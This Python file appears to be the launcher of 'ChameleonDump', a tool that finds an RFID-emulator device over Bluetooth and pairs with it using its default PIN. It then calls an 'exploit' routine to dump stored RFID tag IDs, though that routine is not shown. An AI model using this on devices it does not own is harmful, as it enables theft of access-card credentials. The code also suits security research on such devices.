import os
import asyncio
import argparse
from bleak import BleakClient
from devices import SUPPORTED_DEVICES
from utils.print_with_color import print_with_color
from utils.ble_utils import find_device, is_macos_bluetooth_pairing_dialog_active, pair_macos_bluetooth_device

ASCII_ART = "____            ________                         __                 ____                      \n" \
"/X    ~-.       / ____/ /_  ____ _____ ___  ___  / /__  ____  ____  / __ \\__  ______ ___  ____ \n" \
"\\/ __ .- |     / /   / __ \\/ __ `/ __ `__ \\/ _ \\/ / _ \\/ __ \\/ __ \\/ / / / / / / __ `__ \\/ __ \\\n" \
" // //  @     / /___/ / / / /_/ / / / / / /  __/ /  __/ /_/ / / / / /_/ / /_/ / / / / / / /_/ /\n" \
"              \\____/_/ /_/\\__,_/_/ /_/ /_/\\___/_/\\___/\\____/_/ /_/_____/\\__,_/_/ /_/ /_/ .___/ \n" \
"                                                                                       /_/      "

async def main(loop):
    if os.name != "posix":
        print_with_color("This tool is only supported on macOS.", "red", "[-]")
        return

    parser = argparse.ArgumentParser(description='ChameleonDump')
    parser.add_argument('--device', help='The target device', choices=SUPPORTED_DEVICES.keys(), default="ChameleonUltra")
    parser.add_argument('--pin', help='The PIN to use for pairing, leave empty to use the default PIN')
    parser.add_argument('--mask', help='Mask the RFID tag IDs', type=bool, default=False)
    args = parser.parse_args()

    print_with_color(ASCII_ART, "yellow")
    print_with_color(f"Searching for {args.device}...", "yellow", "[+]")

    device_address = None
    
    while device_address is None:
        device_address = await find_device(args.device)
        if device_address is None:
            await asyncio.sleep(1)

    client = BleakClient(device_address, loop=loop)
    await client.connect()

    if not client.is_connected:
        print_with_color("Failed to connect to the device.", "red", "[!]")
        return

    print_with_color(f"Connected!", "green", "[+]")

    device_class = SUPPORTED_DEVICES[args.device]

    if await is_macos_bluetooth_pairing_dialog_active(loop):
        print_with_color("Pairing dialog is active, trying to pair...", "orange", "[+]")
        pin = args.pin if args.pin else device_class.DEFAULT_PIN
        pair_macos_bluetooth_device(args.device, pin)

    if not client.is_connected:
        print_with_color("Invalid PIN or pairing failed.", "red", "[!]")
        return
    
    device_instance = device_class(client, mask=args.mask)
    
    await device_instance.exploit()
    await client.disconnect()

if __name__ == "__main__":
    try:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main(loop))
        loop.close()
    except KeyboardInterrupt:
        # remove the ^C from the terminal
        print("\b\b", end="")
        print_with_color("Interrupted by user.", "red", "[-]")